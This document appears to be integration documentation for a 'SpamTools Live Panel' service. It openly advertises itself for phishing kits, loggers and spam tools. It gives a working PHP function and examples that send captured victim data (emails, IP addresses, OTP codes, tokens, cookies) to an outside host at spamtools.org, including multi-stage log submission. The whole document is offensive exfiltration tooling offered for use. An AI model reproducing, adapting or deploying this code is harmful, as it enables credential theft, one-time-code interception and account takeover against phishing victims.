# 🚀 Advanced Data Submission (PHP)

The **SpamTools Live Panel** supports advanced, flexible data posting via the `/add-subscription-data` endpoint. This allows you to send **any combination** of `data1` to `data4`, making it ideal for dynamic phishing kits, loggers, or spam tools.

---

## ✅ Endpoint

```
POST https://spamtools.org/wp-json/spamtools/v1/add-subscription-data
```

---

## 🧠 About This Integration

Using our advanced PHP function, you can:

- Send **1 to 4 data fields**
- Submit data in **any order**
- Automatically **skip empty fields**
- Auto-generate or manually provide a `user_session` ID

This is useful for flexible integrations where different payloads collect different types of data.

---

## 🧾 Accepted Parameters

| Field         | Type     | Required | Description                                      |
|---------------|----------|----------|--------------------------------------------------|
| `hash`        | string   | ✅        | Your subscription hash                          |
| `user_session`| string   | ✅*       | Unique session ID (auto-generated if omitted)   |
| `data1`       | string   | ❌        | Any captured data (e.g., email, username)       |
| `data2`       | string   | ❌        | Any captured data (e.g., browser, device)       |
| `data3`       | string   | ❌        | Any captured data (e.g., IP address)            |
| `data4`       | string   | ❌        | Any captured data (e.g., OTP, token, cookies)   |

> ✅ *`user_session` is required, but if you don’t provide one, it will be auto-generated inside the function.

---

## 💻 Sample PHP Integration

```php
<?php
function send($hash, $dataFields, $user_session = null) {
    $endpoint = "https://spamtools.org/wp-json/spamtools/v1/add-subscription-data";

    if (empty($hash)) return;

    $allowed = ['data1', 'data2', 'data3', 'data4'];
    $filtered = [];

    foreach ($allowed as $key) {
        if (isset($dataFields[$key]) && !empty($dataFields[$key])) {
            $filtered[$key] = $dataFields[$key];
        }
    }

    if (empty($filtered)) return;

    if (!$user_session) {
        $user_session = uniqid("session_", true);
    }

    $payload = array_merge([
        "hash" => $hash,
        "user_session" => $user_session
    ], $filtered);

    $ch = curl_init($endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code === 200) {
        echo "✅ Data sent successfully.\n";
    } else {
        echo "❌ Failed (HTTP $http_code): $response\n";
    }
}
?>
```

---

## 🔧 Example Usage

```php
send("abc123hash", [
  "data1" => "Email: user@example.com",
  "data2" => "Browser: Chrome"
]);

send("abc123hash", [
  "data3" => "IP: 192.168.1.1",
  "data4" => "OTP: 382910"
], "session_custom_abc123");
```

---

## 📌 Notes

- You can pass **only the fields you need**. Unused fields are ignored.
- If a `user_session` already exists, the data will be **appended** in the database.
- This is perfect for kits or payloads that send logs in **multiple stages**.

---

